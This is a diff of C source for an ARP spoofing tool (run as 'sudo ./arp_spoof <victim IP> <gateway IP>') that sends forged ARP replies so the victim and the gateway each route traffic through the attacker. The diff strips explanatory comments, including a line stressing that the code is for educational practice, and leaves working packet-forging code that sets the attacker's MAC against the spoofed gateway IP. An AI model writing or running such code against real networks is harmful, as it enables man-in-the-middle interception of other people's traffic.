@@ -3,10 +3,8 @@
  *
  * 사용법: sudo ./arp_spoof <피해자 IP> <게이트웨이 IP>
  *
- * 설명:
  *  - 피해자에게 게이트웨이 IP를, 게이트웨이에게 피해자 IP를 속이는 ARP reply를
- *    주기적으로 전송합니다.
- *  - 본 예제는 교육적 실습을 위한 코드임을 다시 한 번 강조합니다.
+ *    주기적으로 전송.
  */
 
  #include <stdio.h>
@@ -39,11 +37,11 @@
  } EthernetHeader;
  
  typedef struct {
-     uint16_t htype;      // 하드웨어 타입 (Ethernet: 1)
-     uint16_t ptype;      // 프로토콜 타입 (IPv4: 0x0800)
-     uint8_t hlen;        // 하드웨어 주소 길이 (6)
-     uint8_t plen;        // 프로토콜 주소 길이 (4)
-     uint16_t opcode;     // ARP opcode (reply: 2)
+     uint16_t htype;      
+     uint16_t ptype;     
+     uint8_t hlen;        
+     uint8_t plen;      
+     uint16_t opcode;    
      uint8_t sender_mac[6];
      uint32_t sender_ip;
      uint8_t target_mac[6];
@@ -129,18 +127,18 @@
      memset(&packet, 0, sizeof(packet));
  
      // Ethernet 헤더 설정
-     memset(packet.eth.dest, 0xff, 6);              // 브로드캐스트: FF:FF:FF:FF:FF:FF
-     memcpy(packet.eth.src, local_mac, 6);            // 로컬 MAC 주소
+     memset(packet.eth.dest, 0xff, 6);            
+     memcpy(packet.eth.src, local_mac, 6);           
      packet.eth.ethertype = htons(ETH_P_ARP);
  
      // ARP 헤더 공통 설정
-     packet.arp.htype = htons(ARPHRD_ETHER);          // Ethernet
-     packet.arp.ptype = htons(ETH_P_IP);              // IPv4
+     packet.arp.htype = htons(ARPHRD_ETHER);         
+     packet.arp.ptype = htons(ETH_P_IP);             
      packet.arp.hlen = 6;
      packet.arp.plen = 4;
-     packet.arp.opcode = htons(2);                    // ARP Reply
+     packet.arp.opcode = htons(2);                   
  
-     // 첫 번째 ARP 패킷: 피해자에게 (게이트웨이 IP를 내 IP로 속임)
+     // 첫 번째 ARP 패킷
      memcpy(packet.arp.sender_mac, local_mac, 6);     // 송신자: 내 MAC
      packet.arp.sender_ip = inet_addr(gateway_ip_str);  // 속이는 IP: 게이트웨이 IP
      memset(packet.arp.target_mac, 0x00, 6);          // 타겟 MAC: 00:00:00:00:00:00
